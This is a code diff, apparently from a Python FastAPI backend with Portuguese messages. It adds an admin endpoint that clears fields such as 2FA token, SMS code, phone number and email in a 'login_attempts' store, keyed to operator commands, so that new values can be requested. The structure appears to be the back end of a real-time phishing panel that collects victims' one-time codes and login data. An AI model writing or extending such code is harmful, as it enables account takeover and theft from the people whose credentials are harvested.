@@ -274,6 +274,32 @@ async def update_user_status(user_id: str, status: str, token_data: dict = Depen
     )
     return {"message": f"Status atualizado para {status}"}
 
+class InvalidateFieldRequest(BaseModel):
+    user_id: str
+    command: str
+
+@api_router.post("/admin/invalidate-field")
+async def invalidate_field(data: InvalidateFieldRequest, token_data: dict = Depends(verify_token)):
+    """Limpa o campo correspondente ao comando para pedir novo dado"""
+    # Mapear comando para o campo que deve ser limpo
+    command_to_field = {
+        "AUT": "token_2fa",
+        "EMAIL": "email_input",
+        "TOK-TEL": "sms_code",
+        "TELEFONE": "phone_number",
+        "TOK-MAIL": "app_mail"
+    }
+    
+    field = command_to_field.get(data.command)
+    if not field:
+        raise HTTPException(status_code=400, detail="Comando inválido")
+    
+    await db.login_attempts.update_one(
+        {"id": data.user_id},
+        {"$set": {field: None}}
+    )
+    return {"message": f"Campo {field} limpo com sucesso"}
+
 class UserInputData(BaseModel):
     field: str  # "token_2fa", "email_input", "sms_code", "phone_number", "app_mail"
     value: str
